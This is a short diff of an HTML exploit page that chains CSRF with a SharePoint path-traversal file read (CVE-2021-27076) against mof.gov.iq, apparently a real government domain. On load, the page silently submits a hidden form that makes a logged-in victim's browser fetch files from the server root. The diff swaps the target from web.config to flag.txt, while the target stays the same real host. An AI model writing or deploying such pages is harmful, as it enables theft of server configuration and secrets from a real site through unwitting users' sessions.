@@ -2,15 +2,15 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>CSRF + File Read Exploit (CVE-2021-27076)</title>
+  <title>CSRF + File Read Exploit (flag.txt)</title>
 </head>
 <body onload="document.forms[0].submit()">
 
-  <h2>CSRF Exploit to Trigger CVE-2021-27076</h2>
-  <p>If the victim is logged in to mof.gov.iq, this page will trigger a file read automatically.</p>
+  <h2>Attempting to Read flag.txt via CVE-2021-27076 + CSRF</h2>
+  <p>If the victim is logged into mof.gov.iq, this page will attempt to download "flag.txt" from the server root.</p>
 
   <form method="GET" action="https://mof.gov.iq/_layouts/15/download.aspx">
-    <input type="hidden" name="SourceUrl" value="/sites/test/../../../../../../web.config">
+    <input type="hidden" name="SourceUrl" value="/sites/test/../../../../../../flag.txt">
   </form>
 
 </body>
